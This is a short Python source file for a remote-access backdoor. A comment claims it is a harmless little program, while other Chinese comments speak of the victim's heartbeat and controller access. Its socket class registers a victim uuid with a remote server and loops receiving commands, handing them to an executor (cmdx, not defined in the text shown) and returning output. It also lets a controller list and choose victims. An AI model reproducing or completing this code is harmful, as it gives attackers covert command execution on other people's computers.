#!/usr/bin/python
# -*- coding: UTF-8 -*-
#这是一个人畜无害的小程序
import os
import socket
import time
import json



class Socketz():

	def __init__(self,host,port,data=""):
		self.data = data
		self.host = host
		self.port = port
		self.sock = socket.socket()

	def connect(self):
		self.sock.connect((self.host, self.port))


	def heart(self):
		#发送被害心跳的函数
		self.sock.send("heart".encode("utf-8"))
		my = self.sock.recv(1024).decode("utf-8")
		#发送uuid
		self.sock.send(self.data.encode("utf-8"))
		server_rec = self.sock.recv(1024).decode("utf-8")

		return server_rec


	def long_tcp(self):
		while True:
			cmd = self.sock.recv(1024).decode("utf-8")
			cmd = cmd.split("@")
			data = cmdx(cmd)
			if data == None:
				data = "None"
			self.sock.send(data.encode("utf-8"))


	def get_user(self):
		#发送控制端接入命令
		self.sock.send("ctrl".encode("utf-8"))
		userlistjm = self.sock.recv(2048).decode("utf-8")
		userlist = []
		lista = userlistjm.split("ercengfenli")
		for x in lista:
			sunlist = x.split("yicengfenli")
			userlist.append(sunlist)

		print(userlist)
		userdata = input("uuid:")

		#发送uuid
		self.sock.send(userdata.encode("utf-8"))
		server_rec = self.sock.recv(1024).decode("utf-8")

		return server_rec


	def stop(self):
		self.sock.close()

